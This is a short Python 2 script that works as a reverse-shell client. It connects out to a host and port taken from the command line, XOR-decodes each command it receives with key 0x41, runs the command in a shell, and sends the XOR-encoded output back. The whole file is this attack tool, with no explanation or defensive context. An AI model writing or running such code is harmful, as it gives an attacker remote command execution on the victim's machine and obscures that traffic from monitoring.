# coding : utf-8

import socket,subprocess,sys

RHOST = sys.argv[1]
RPORT = 2300

client = socket.socket()
client.connect((RHOST, RPORT))
while True:

    data = client.recv(1024)

    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] ^= 0x41

    comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    comm.wait()

    STDOUT, STDERR = comm.communicate()
    print STDERR

    en_STDOUT = bytearray(STDOUT)
    for i in range(len(en_STDOUT)):
        en_STDOUT[i] ^= 0x41
    client.send(en_STDOUT)

client.close()




